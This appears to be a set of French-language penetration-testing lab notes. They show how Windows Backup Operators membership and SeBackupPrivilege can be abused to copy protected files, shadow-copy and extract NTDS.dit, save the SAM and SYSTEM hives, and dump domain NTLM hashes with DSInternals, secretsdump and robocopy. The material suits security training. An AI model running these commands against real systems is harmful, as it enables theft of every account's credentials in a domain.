# Backup Operators

### <mark style="color:red;">Backup Operators</mark>

{% hint style="warning" %}
Utilise `whoami /groups` après avoir pris la main sur une machine pour voir à quels groupes ton compte appartient.

* **Groupe Backup Operators :**\
  Si tu es membre de ce groupe, tu obtiens deux privilèges importants :
  * [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges)&#x20;
  * `SeRestorePrivilege`
* **Ce que permet SeBackupPrivilege :**
  * Tu peux **parcourir n’importe quel dossier**, même sans permission explicite.
  * Tu peux **lister et copier des fichiers**, **même si tu n'es pas dans les ACLs** du dossier.
* **Attention :**
  * Tu **ne peux pas utiliser la commande `copy` classique** pour cela.
  * Il faut **copier les données via un script ou un programme** qui utilise un flag spécial : [FILE\_FLAG\_BACKUP\_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea).
* **Exploitation (PoC) :**
  * Tu peux utiliser **un script PowerShell ou C#** pour profiter de ce privilège.[PoC](https://github.com/giuliano108/SeBackupPrivilege)
  * Le script importe des bibliothèques pour copier des fichiers comme si tu faisais une sauvegarde système.
{% endhint %}

<mark style="color:green;">**Importing Libraries**</mark>

```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

<mark style="color:green;">**Verifying SeBackupPrivilege is Enabled**</mark>

```powershell-session
PS C:\htb> whoami /priv
```

```powershell-session
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

<mark style="color:green;">**Enabling SeBackupPrivilege**</mark>

If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```powershell-session
PS C:\htb> whoami /priv
```

<mark style="color:green;">**Copying a Protected File**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes
```
{% endcode %}

***

<mark style="color:green;">**Attacking a Domain Controller - Copying NTDS.dit**</mark>

{% hint style="warning" %}
**Groupe spécial** : Certains groupes (comme Backup Operators ou Administrateurs) peuvent se connecter **localement** sur un **contrôleur de domaine**.

* **Fichier cible : NTDS.dit**
  * C’est la **base de données Active Directory**.
  * Elle contient les **hashs NTLM de tous les utilisateurs et ordinateurs** du domaine.
  * Donc, elle est une **cible très sensible et précieuse**.
* **Problème** :
  * Le fichier `NTDS.dit` est **verrouillé par le système** (utilisé en permanence).
  * Il est **inaccessible pour un utilisateur non privilégié**.
* **Solution : Shadow Copy**
  * On utilise l’outil **`diskshadow`** de Windows pour créer une **copie instantanée du disque C: (shadow copy)**.
  * Cette copie est montée en tant que **nouveau lecteur (ex. E:)**.
  * Le fichier `NTDS.dit` **dans la shadow copy n’est pas verrouillé** → on peut donc le copier et l'exfiltrer.
{% endhint %}

```powershell
PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\
```

<mark style="color:green;">**Copying NTDS.dit Locally**</mark>

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

<mark style="color:green;">**Backing up SAM and SYSTEM Registry Hives**</mark>

```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV


C:\htb> reg save HKLM\SAM SAM.SAV
```

<mark style="color:green;">**Extracting Credentials from NTDS.dit**</mark>

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
{% endcode %}

<mark style="color:green;">**Extracting Hashes Using SecretsDump**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
{% endcode %}

***

### <mark style="color:red;">Robocopy</mark>

{% hint style="warning" %}
<mark style="color:green;">**Robocopy (Robust File Copy)**</mark> est un **outil en ligne de commande** de Windows conçu pour **copier des répertoires entiers** de manière fiable.

* Il peut être utilisé en **mode sauvegarde**, ce qui permet de copier des fichiers même sans autorisations classiques (si l’on a le droit SeBackupPrivilege).
* Contrairement à la commande `copy`, **robocopy est plus puissant** :
  * **Multi-threading** (copie plusieurs fichiers en parallèle)
  * **Reprise automatique** si la copie échoue
  * **Reprise là où ça s'est arrêté** après une interruption
  * **Comparaison de fichiers** pour ne copier que ceux qui ont changé
* Il peut aussi **synchroniser des répertoires** :
  * Supprime les fichiers de destination qui n’existent plus dans la source
  * Gagne du temps en **ne recopiant pas les fichiers identiques**
{% endhint %}

```cmd-session
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
